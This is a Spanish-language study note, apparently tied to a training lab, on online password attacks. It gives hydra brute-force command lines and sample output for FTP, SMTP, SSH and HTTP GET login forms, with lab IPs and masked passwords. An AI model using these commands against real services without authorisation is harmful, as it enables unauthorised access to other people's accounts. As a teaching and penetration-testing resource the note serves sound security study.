---
layout: apunte
title: "8. Online Password Attacks"
---

Los ataques de contraseñas online involucran adivinar las contraseñas para servicios en red que usan nombre de usuario y autentificación mediante contraseña, como HTTP, SSH, VNC, SNMP, POP3, etc. Esta sección muestra cómo usar `hydra`, una herramienta común para este tipo de ataques.

------------------------------------
<h2>Hydra</h2>
Hydra soporta una lista extensa de servicios de red a los que puede atacar. Usando hydra, bruteforcearemos servicios como páginas web de login, FTP, SMTP, y SSH. Normalmente en hydra, cada servicio tiene sus propias opciones y sintaxis.

-----------------------
<h2>FTP</h2>
En el siguiente escenario, realizaremos un ataque de fuerza bruta sobre un servidor FTP. Comprobando las opciones de ayuda de hydra, sabemos que la sintaxis es la siguiente:

```bash
hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

- `-l ftp`: Especifica el nombre de usuario. Si fuera una lista sería `-L`.
- `-P Path`: Especifica la ruta de la wordlist. Si fuera una sóla contraseña podrías usar `-p password`.
- `ftp://10.10.x.x`: El protocolo y la dirección IP del objetivo.

----------------------------------
<h2>SMTP</h2>
De forma similar a los servidores FTP, también podemos realizar fuerza bruta a los servidores SMTP usando `hydra`. La sintaxis es similar, pero cambia el protocolo objetivo. Si quieres usar otro puerto que no sea el puerto por defecto, deberás especificarlo.

```bash
user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 7 tasks per 1 server, overall 7 tasks, 7 login tries (l:1/p:7), ~1 try per task
[DATA] attacking smtp://10.10.x.x:25/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.10.x.x   login: email@company.xyz password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

-----------------------------
<h2>SSH</h2>
La fuerza bruta de SSH puede ser común si tu servidor tiene acceso a internet. Hydra soporta varios protocolos, incluyendo SSH. Podemos usar la sintaxis previa para realizar nuestro ataque. Es importante recalcar que los ataques de contraseña confían en tener un diccionario excelente para incrementar las probabilidades de encontrar un nombre de usuario y contraseña válidos.

```bash
user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 8 tasks per 1 server, overall 8 tasks, 8 login tries (l:1/p:8), ~1 try per task
[DATA] attacking ssh://10.10.x.x:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://user@10.10.x.x:22
[INFO] Successful, password authentication is supported by ssh://10.10.x.x:22
[22][ssh] host: 10.10.x.x   login: victim   password: xxxxxxxx
[STATUS] attack finished for 10.10.x.x (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

---------------------------------------------
<h2>Páginas de Login HTTP</h2>
En este escenario, haremos fuerza bruta a las páginas HTTP de login. Para hacerlo, primero necesitamos entender lo que estamos bruteforceando. Usando hydra, es importante especificar el tipo de petición HTTP ya sea `GET` o `POST`. Comprobando las opciones: `hydra http-get-form -U`, podemos ver que tiene la siguiente sintaxis:

`<url>:<form parameters>:<condition string>[:<optional>[:<optional>]`

Como ya hemos mencionado antes, necesitamos analizar la petición HTTP que queremos mandar y que podría sesr hecho mediante las herramientas de desarrollador del navegador como por herramientas como BurpSuite.

```bash
user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 
Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. 

Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 
[DATA] max 16 tasks per 1 server, overall 16 tasks, 500 login tries (l:1/p:500), ~32 tries per task 
[DATA] attacking http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&password=^PASS^:S=logout.php 
[80][http-get-form] host: 10.10.x.x   login: admin password: xxxxxx 
1 of 1 target successfully completed, 1 valid password found 
Hydra (http://www.thc.org/thc-hydra) 
finished at 2021-10-13 08:06:45
```

- `-l admin`: Especifica el nombre de usuario. Podría usar `-L` para una lista de estos.
- `-P path`: Especifica la ruta al diccionario.
- `10.10.x.x`: Dirección IP del objetivo (o URL).
- `http-get-form`: El tipo de petición HTTP. Puede ser tanto `http-get-form` como `http-post-form`.
- `login-get/index.php`: La ruta de la página de login en el servidor web.
- `username=^USER^&password=^PASS^`: Los parámetros de la fuerza bruta (pueden variar tanto `username` como `password`). Luego intertamos `^USER^` y `^PASS^` para decirle cuál corresponde a cada diccionario.
- `F=`: Nos deja especificar un caso para el error. De esta manera se evitan falsos positivos.
- `S=`: Nos deja especificar condiciones de éxito.

O por ejemplo, durante la enumeración, encontramos que el servidor sirve `logout.php`. Después de iniciar sesión en la página con credenciales válidas, podríamos adivinar que tendremos `logout.php` en algún sitio de la página. Es por esto que podemos usar `S=logout.php` para que `hydra` busque el texto en la respuesta HTML, lo que implicará que la ssesión ha sido iniciada.

Podemos usar `-f` para parar los ataques después de encontrar un nombre de usuario y contraseña válidos.